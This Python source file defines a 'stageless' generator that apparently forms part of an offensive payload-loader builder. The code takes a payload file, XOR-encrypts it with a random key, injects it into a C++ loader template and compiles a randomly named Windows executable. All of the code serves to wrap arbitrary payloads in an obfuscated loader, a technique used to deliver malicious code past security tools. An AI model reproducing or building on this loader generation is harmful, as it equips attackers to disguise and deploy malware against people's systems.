import os
import tempfile
from pathlib import Path
from core.payload import process_payload, encrypt_payload, generate_payload_declaration
from core.crypto import random_key
from generators.base import BaseGenerator
from utils.helpers import colored_print


class StagelessGenerator(BaseGenerator):
    def generate(self) -> str | None:
        colored_print("[+] Generating stageless loader...", "green")

        payload_path = self.override_payload or self.profile.payload.file
        if not payload_path:
            colored_print("[-] No payload file specified", "red")
            return None

        payload_data = process_payload(payload_path)
        self.xor_key = random_key(16)
        enc_payload = encrypt_payload(payload_data, self.xor_key)

        colored_print(f"    Payload: {payload_path} ({len(payload_data)} bytes)", "cyan")
        colored_print(f"    XOR key: {self.xor_key.hex()}", "cyan")

        workdir = tempfile.mkdtemp(prefix="ol_")

        try:
            self._process_extensions()
            self._write_temp_source(workdir)

            ldr_content = (Path(workdir) / "loader.cpp").read_text()

            payload_decl = generate_payload_declaration(enc_payload)
            ldr_content = ldr_content.replace("__PAYLOAD_DECL__", payload_decl)

            (Path(workdir) / "loader.cpp").write_text(ldr_content)

            output_path = self.profile.output.path
            if not output_path:
                output_path = f"output/loader_{os.urandom(4).hex()}.exe"

            if self._compile(workdir, output_path, self.profile.output.type):
                return output_path

        finally:
            import shutil
            shutil.rmtree(workdir, ignore_errors=True)

        return None
